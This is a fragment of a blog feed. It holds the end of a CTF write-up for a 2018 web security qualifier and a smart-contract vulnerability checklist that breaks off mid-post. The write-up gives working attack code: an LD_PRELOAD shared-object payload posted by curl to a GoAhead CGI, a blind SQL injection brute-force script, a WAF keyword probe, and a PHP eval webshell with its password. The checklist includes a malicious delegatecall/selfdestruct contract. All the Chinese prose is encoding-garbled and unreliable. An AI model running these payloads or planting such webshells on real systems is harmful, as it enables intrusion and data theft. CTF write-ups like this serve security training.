class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* printf("hello, payload executed.\n"); */</span></span><br><span class="line">    system(<span class="string">"cat /var/www/goahead/cgi-bin/hello.cgi"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -shared -fPIC ./payload.c -o payload.so</span><br></pre></td></tr></table></figure></p><p>è§¦å‘payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST --data-binary @payload.so http://114.55.36.69:8018/cgi-bin/hello.cgi?LD_PRELOAD=/proc/self/fd/0 -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: GoAhead-http</span><br><span class="line">Date: Fri Oct 12 13:38:48 2018</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">"Content-Type: text/html\n\n"</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">"Hello GOGOGO"</span>;</span><br><span class="line"><span class="comment">#flag&#123;ef9f1f880e1f001bedd32bfc52674128&#125;</span></span><br><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line">curl: (56) Illegal or missing hexadecimal sequence <span class="keyword">in</span> chunked-encoding</span><br></pre></td></tr></table></figure><h1 id="è¿›å‡»çš„ç›²æ³¨"><a href="#è¿›å‡»çš„ç›²æ³¨" class="headerlink" title="è¿›å‡»çš„ç›²æ³¨"></a>è¿›å‡»çš„ç›²æ³¨</h1><h2 id="0x01-æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#0x01-æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="0x01 æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>0x01 æ•æ„Ÿä¿¡æ¯æ³„éœ²</h2><p>æ‰«æå­˜åœ¨robots.txt</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1539405059283.png" alt="1539405059283"></p><h2 id="0x02-SQLç›²æ³¨"><a href="#0x02-SQLç›²æ³¨" class="headerlink" title="0x02 SQLç›²æ³¨"></a>0x02 SQLç›²æ³¨</h2><p>çœ‹æºç ï¼Œusernameå¤„å­˜åœ¨æ³¨å…¥ï¼Œè¿‡æ»¤ç¬¦å·â€(â€œ,â€)â€</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1539405263908.png" alt="1539405263908"></p><p>ä½¿ç”¨regexp binaryæ³¨å…¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">burp0_url = <span class="string">"http://114.55.36.69:6663/index.php"</span></span><br><span class="line">burp0_headers = &#123;</span><br><span class="line">    <span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>,</span><br><span class="line">    <span class="string">"Origin"</span>: <span class="string">"http://114.55.36.69:6663"</span>,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36"</span>,</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Referer"</span>: <span class="string">"http://114.55.36.69:6663/"</span>,</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>,</span><br><span class="line">    <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line"></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">payload = <span class="string">"admin' and password regexp binary '^&#123;res&#125;'#"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        <span class="keyword">if</span> chr(j) <span class="keyword">in</span> [<span class="string">'*'</span>,<span class="string">'\\'</span>,<span class="string">'/'</span>,<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'+'</span>,<span class="string">'.'</span>,<span class="string">'?'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">'^'</span>]:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        hh = payload.format(res=result+chr(j)</span><br><span class="line">        <span class="keyword">print</span> hh</span><br><span class="line"></span><br><span class="line">        burp0_data = &#123;<span class="string">"username"</span>: hh, <span class="string">"password"</span>: <span class="string">"admin"</span>&#125;</span><br><span class="line">        zz = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line">        <span class="comment">#print zz.content</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'password error!'</span> <span class="keyword">in</span> zz.content:</span><br><span class="line">            result += chr(j)</span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼šdVAxMEBkX25Fdy5waHA=$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$</p><p>base64è§£ç åå¾—åˆ°uP10@d_nEw.php</p><h2 id="0x03-æ–‡ä»¶ä¸Šä¼ ç»•è¿‡"><a href="#0x03-æ–‡ä»¶ä¸Šä¼ ç»•è¿‡" class="headerlink" title="0x03 æ–‡ä»¶ä¸Šä¼ ç»•è¿‡"></a>0x03 æ–‡ä»¶ä¸Šä¼ ç»•è¿‡</h2><p>è®¿é—®çœ‹åˆ°ä¸€ä¸ªä¸Šä¼ ç•Œé¢</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1539405581893.png" alt="1539405581893"></p><p>ä¼ å¤§é©¬ï¼Œå‘ç°æ ¹ç›®å½•ä¸‹å­˜åœ¨flagï¼š</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1539405664157.png" alt="1539405664157"></p><h1 id="è‰°éš¾çš„Bypassä¹‹è·¯"><a href="#è‰°éš¾çš„Bypassä¹‹è·¯" class="headerlink" title="è‰°éš¾çš„Bypassä¹‹è·¯"></a>è‰°éš¾çš„Bypassä¹‹è·¯</h1><p>ç”¨æˆ·åçˆ†ç ´ï¼Œå‘ç°liliå¯ç”¨ï¼š</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1539415423719.png" alt="1539415423719"></p><p>æŸ¥çœ‹å“ªäº›å…³é”®è¯è¢«è¿‡æ»¤ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detect</span><span class="params">()</span>:</span></span><br><span class="line">    waf_words=[<span class="string">'ord'</span>, <span class="string">'or'</span>, <span class="string">'union'</span>, <span class="string">'select'</span>, <span class="string">'and'</span>, <span class="string">'from'</span>, <span class="string">'order by'</span>, <span class="string">'substr'</span>, <span class="string">"'"</span>, <span class="string">'*'</span>, <span class="string">'&amp;&amp;'</span>, <span class="string">'information_schema'</span>, <span class="string">' '</span>, <span class="string">'%'</span>, <span class="string">'group_concat'</span>, <span class="string">'('</span>, <span class="string">'"'</span>, <span class="string">'where'</span>, <span class="string">'if'</span>, <span class="string">' '</span>, <span class="string">'||'</span>, <span class="string">'#'</span>, <span class="string">'--+'</span>, <span class="string">'_'</span>, <span class="string">'`'</span>, <span class="string">'/'</span>, <span class="string">'&lt;&gt;'</span>, <span class="string">'in'</span>, <span class="string">'='</span>, <span class="string">'mid'</span>, <span class="string">'like'</span>, <span class="string">'database()'</span>, <span class="string">'&gt;'</span>, <span class="string">'user()'</span>, <span class="string">'tables'</span>, <span class="string">'limit'</span>]</span><br><span class="line">    burp0_url = <span class="string">"http://114.55.36.69:6661/index.php"</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">"PHPSESSID"</span>: <span class="string">"jrspq1dsdrt8gn6tqq35mdatn0"</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>, <span class="string">"Origin"</span>: <span class="string">"http://114.55.36.69:6661"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>, <span class="string">"Referer"</span>: <span class="string">"http://114.55.36.69:6661/"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> waf_words:</span><br><span class="line">        burp0_data=&#123;<span class="string">"username"</span>: <span class="string">"admin&#123;&#125;"</span>.format(each), <span class="string">"passwd"</span>: <span class="string">"admin"</span>&#125;</span><br><span class="line">        res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"illegal characters!"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="keyword">print</span> each</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    detect()</span><br></pre></td></tr></table></figure><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1539416324206.png" alt="1539416324206"></p><h1 id="éæ­£å¸¸è§£æ³•"><a href="#éæ­£å¸¸è§£æ³•" class="headerlink" title="éæ­£å¸¸è§£æ³•"></a>éæ­£å¸¸è§£æ³•</h1><p>æ‰«æåˆ°ä¸Šä¼ ç›®å½•</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1539347922000.png" alt="1539347922000"></p><h3 id="0x01-å‘ç°dalaoç•™çš„åé—¨"><a href="#0x01-å‘ç°dalaoç•™çš„åé—¨" class="headerlink" title="0x01 å‘ç°dalaoç•™çš„åé—¨"></a>0x01 å‘ç°dalaoç•™çš„åé—¨</h3><p><a href="http://114.55.36.69:6663/uploads/" target="_blank" rel="noopener">http://114.55.36.69:6663/uploads/</a></p><h3 id="0x02-ç›´æ¥ç”¨å¤§ä½¬çš„åé—¨"><a href="#0x02-ç›´æ¥ç”¨å¤§ä½¬çš„åé—¨" class="headerlink" title="0x02 ç›´æ¥ç”¨å¤§ä½¬çš„åé—¨"></a>0x02 ç›´æ¥ç”¨å¤§ä½¬çš„åé—¨</h3><p>ä»¥<code>a.php;.jpg</code>ä¸ºä¾‹ï¼ŒæŸ¥çœ‹åé—¨å¯†ç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"pHp"</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'sb'</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>èœåˆ€è¿æ¥ï¼ŒæŸ¥çœ‹flag</p><p>/flag</p><p>æˆ–è€…å¤§é©¬<code>http://114.55.36.69:6663/uploads/shell.php.jpg</code> å¯†ç admin</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ™ºèƒ½åˆçº¦Checklist</title>
      <link href="/blockchain-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6checklist/"/>
      <url>/blockchain-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6checklist/</url>
      
        <content type="html"><![CDATA[<p><strong>æœ¬æ–‡é¦–æ¬¡å‘è¡¨åœ¨<a href="https://www.freebuf.com/vuls/183357.html" target="_blank" rel="noopener">Freebuf</a>ä¸Šï¼Œæœ¬æ–‡åªåšå½’æ¡£ç”¨ã€‚</strong></p><h1 id="æ•´å½¢æº¢å‡º-Arithmetic-Issues"><a href="#æ•´å½¢æº¢å‡º-Arithmetic-Issues" class="headerlink" title="æ•´å½¢æº¢å‡º(Arithmetic Issues)"></a>æ•´å½¢æº¢å‡º(Arithmetic Issues)</h1><p>å¦‚ä¸‹ä»£ç ï¼Œå¦‚æœæ²¡æœ‰assertåˆ¤æ–­ï¼Œé‚£ä¹ˆsellerBalance+valueå¯èƒ½ä¼šè¶…å‡ºuintä¸Šé™åˆ¶å¯¼è‡´æº¢å‡ºã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.15</span>;</span><br><span class="line">contract Overflow &#123;</span><br><span class="line">    uint private sellerBalance=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">uint value</span>) <span class="title">returns</span> (<span class="params">bool, uint</span>)</span>&#123;</span><br><span class="line">        sellerBalance += value; <span class="comment">// complicated math with possible overflow</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// possible auditor assert</span></span><br><span class="line">        assert(sellerBalance &gt;= value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="å±é™©çš„delegatecall-dangerous-delegatecall-contractfuzzer"><a href="#å±é™©çš„delegatecall-dangerous-delegatecall-contractfuzzer" class="headerlink" title="å±é™©çš„delegatecall(dangerous delegatecall)contractfuzzer"></a>å±é™©çš„delegatecall(dangerous delegatecall)<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup></h1><p>é¦–å…ˆéœ€è¦äº†è§£callå’Œdelegatecallçš„åŒºåˆ«ï¼šcallå’Œdelegatecalléƒ½ä¸ºåˆçº¦ç›¸äº’è°ƒç”¨æ—¶çš„å‡½æ•°ï¼Œå‡è®¾Aè°ƒç”¨Bå‡½æ•°ï¼Œcallæ–¹æ³•ç»“æœå±•ç¤ºåˆ°Bä¸­ï¼Œdelegatecallæ–¹æ³•ç»“æœå±•ç¤ºåˆ°Aä¸­ã€‚</p><p>åœ¨å¦‚ä¸‹ç¤ºä¾‹ä¸­ï¼ŒMarkå¦‚æœç”¨delegatecallè°ƒç”¨äº†æ¶æ„åˆçº¦Stealï¼Œé‚£ä¹ˆMarkåˆçº¦ä¼šè¢«åˆ é™¤ã€‚</p><p>å¤ç°ï¼š</p><ol><li>ç”¨Aè´¦æˆ·éƒ¨ç½²Stealï¼Œç”¨Bè´¦æˆ·éƒ¨ç½²Markåˆçº¦ï¼Œå¹¶åœ¨éƒ¨ç½²æ—¶ä¸ºåˆçº¦é™„åŠ 10ä¸ªetherã€‚</li><li>è´¦æˆ·Bè°ƒç”¨Mark.call(address(Steal))ï¼Œå³ç”¨Bè°ƒç”¨Stealçš„Innocenceæ–¹æ³•ï¼Œå®é™…ä¸Šinnocenceä¼šåœ¨Markçš„ä¸Šä¸‹æ–‡ç¯å¢ƒè¿è¡Œï¼Œå‘ç°è´¦æˆ·Bæ”¶åˆ°åˆçº¦çš„10 etherï¼ˆ<strong>æ³¨æ„ä¸æ˜¯Aè´¦æˆ·</strong>)</li><li>ç”¨Cè´¦æˆ·æ‰§è¡ŒMark.deposit()æ–¹æ³•ï¼Œå¹¶é™„åŠ 10etherï¼Œå†è°ƒç”¨destructæ–¹æ³•ï¼Œå‘ç°Bæ— æ³•æ”¶åˆ°10etherï¼Œè¯´æ˜åˆçº¦ç¡®å®å·²ç»åœ¨ç¬¬äºŒæ­¥è¢«é”€æ¯ã€‚</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.2</span>;</span><br><span class="line">contract Steal&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    <span class="keyword">constructor</span> () payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">innocence</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        log0(<span class="string">"123"</span>);</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Mark &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    <span class="keyword">constructor</span> () payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Deposit</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params">address a</span>) </span>&#123;</span><br><span class="line">        a.delegatecall(bytes4(keccak256(<span class="string">"innocence()"</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ— Gaså‘é€-Gasless-Send-contractfuzzer"><a href="#æ— Gaså‘é€-Gasless-Send-contractfuzzer" class="headerlink" title="æ— Gaså‘é€(Gasless Send)contractfuzzer"></a>æ— Gaså‘é€(Gasless Send)<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup></h1><p>åˆçº¦Cè°ƒç”¨åˆçº¦D1æ—¶ï¼Œç”±äºfallbackå‡½æ•°ä¿®æ”¹äº†storageå˜é‡â€”â€”è¿™æ˜¯ä¸€ä¸ªæ¶ˆè€—å¤§é‡gasçš„æ“ä½œâ€”â€”å¯¼è‡´äº†è¶…è¿‡fallbackçš„gasä¸Šé™(2300gas)å¯¼è‡´fallbackå¤±è´¥ï¼Œè°ƒç”¨D2æ—¶ï¼Œç”±äºæ²¡æœ‰è¶…è¿‡ä¸Šé™ï¼Œè°ƒç”¨æˆåŠŸã€‚</p><p>å¤ç°ï¼š</p><ol><li>ç”¨10etheréƒ¨ç½²Cåˆçº¦ï¼Œ0etheréƒ¨ç½²D1åˆçº¦ï¼Œ0etheréƒ¨ç½²D2åˆçº¦</li><li>è°ƒç”¨C.pay(1000000000000000000, address(D1))ï¼ŒD1çš„countå€¼ä»ä¸º0ã€‚</li><li>è°ƒç”¨D1.kill()ï¼Œä»¥å¤ªå¸ä¸å¢åŠ ã€‚2,3ä¸¤æ­¥è¯´æ˜äº†D1çš„fallbackè°ƒç”¨å¤±è´¥</li><li>è°ƒç”¨C.pay(1000000000000000000,address(D2))</li><li>è°ƒç”¨D2.kill()ï¼Œå‘ç°è´¦æˆ·å¢åŠ 1etherï¼Œè¯´æ˜D2çš„fallbackè°ƒç”¨æˆåŠŸ</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.2</span>;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    <span class="keyword">constructor</span> () payable&#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">pay</span>(<span class="params">uint n, address d</span>)</span>&#123;</span><br><span class="line">        d.send(n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">kill</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (owner == msg.sender) &#123;</span><br><span class="line">          selfdestruct(owner);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract D1 &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    uint public count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">constructor</span> () payable&#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        count = count+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">kill</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (owner == msg.sender) &#123;</span><br><span class="line">          selfdestruct(owner);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract D2  &#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span> () payable&#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">kill</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (owner == msg.sender) &#123;</span><br><span class="line">          selfdestruct(owner);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ä¾èµ–äºäº¤æ˜“é¡ºåº-æ¡ä»¶ç«äº‰-TOD-Front-Running-smarter"><a href="#ä¾èµ–äºäº¤æ˜“é¡ºåº-æ¡ä»¶ç«äº‰-TOD-Front-Running-smarter" class="headerlink" title="ä¾èµ–äºäº¤æ˜“é¡ºåº/æ¡ä»¶ç«äº‰(TOD/Front Running)smarter"></a>ä¾èµ–äºäº¤æ˜“é¡ºåº/æ¡ä»¶ç«äº‰(TOD/Front Running)<sup><a href="#fn_smarter" id="reffn_smarter">smarter</a></sup></h1><p>ç”±äºï¼š</p><ol><li>åªæœ‰å½“äº¤æ˜“è¢«æ‰“åŒ…è¿›åŒºå—æ—¶ï¼Œä»–æ‰æ˜¯ä¸å¯æ›´æ”¹çš„</li><li>åŒºå—ä¼šä¼˜å…ˆæ‰“åŒ…gaspriceæ›´é«˜çš„äº¤æ˜“</li></ol><p>æ‰€ä»¥æ”»å‡»è€…å¯ä»¥æ¶æ„æ“æ§äº¤æ˜“é¡ºåºä»è€Œä½¿åˆçº¦å¯¹è‡ªå·±æœ‰åˆ©ã€‚å¦‚å›¾ï¼Œå‡ºé¢˜äººå’Œåšé¢˜äººåŒæ—¶å‘èµ·åˆçº¦ï¼Œé‚£ä¹ˆåšé¢˜äººå¾—åˆ°çš„å¥–åŠ±å› åˆçº¦æ‰§è¡Œé¡ºåºä¸åŒè€Œä¸åŒã€‚</p><p><img src="/blockchain-æ™ºèƒ½åˆçº¦checklist/1534317198703.png" alt="1534317198703"></p><p>å†ä¾‹å¦‚ERC20æ ‡å‡†ä¸­çš„approveï¼Œæ•´ä¸ªæµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p><ol><li>ç”¨æˆ·Aæˆæƒç”¨æˆ·B 100ä»£å¸çš„é¢åº¦</li><li>ç”¨æˆ·Aè§‰å¾—100ä»£å¸çš„é¢åº¦å¤ªé«˜äº†ï¼Œå†æ¬¡è°ƒç”¨approveè¯•å›¾æŠŠé¢åº¦æ”¹ä¸º50</li><li>ç”¨æˆ·Båœ¨å¾…äº¤æ˜“å¤„ï¼ˆæ‰“åŒ…å‰ï¼‰çœ‹åˆ°äº†è¿™ç¬”äº¤æ˜“</li><li>ç”¨æˆ·Bæ„é€ ä¸€ç¬”æå–100ä»£å¸çš„äº¤æ˜“ï¼Œé€šè¿‡æ¡ä»¶ç«äº‰å°†è¿™ç¬”äº¤æ˜“æ‰“åŒ…åˆ°äº†ä¿®æ”¹é¢åº¦ä¹‹å‰ï¼ŒæˆåŠŸæå–äº†100ä»£å¸</li><li>ç”¨æˆ·Bå‘èµ·äº†ç¬¬äºŒæ¬¡äº¤æ˜“ï¼Œæå–50ä»£å¸ï¼Œç”¨æˆ·BæˆåŠŸæ‹¥æœ‰äº†150ä»£å¸</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function approve(address _spender, uint256 _value) public returns (bool success)&#123;</span><br><span class="line">    allowance[msg.sender][_spender] = _value;</span><br><span class="line">    return true</span><br></pre></td></tr></table></figure><h1 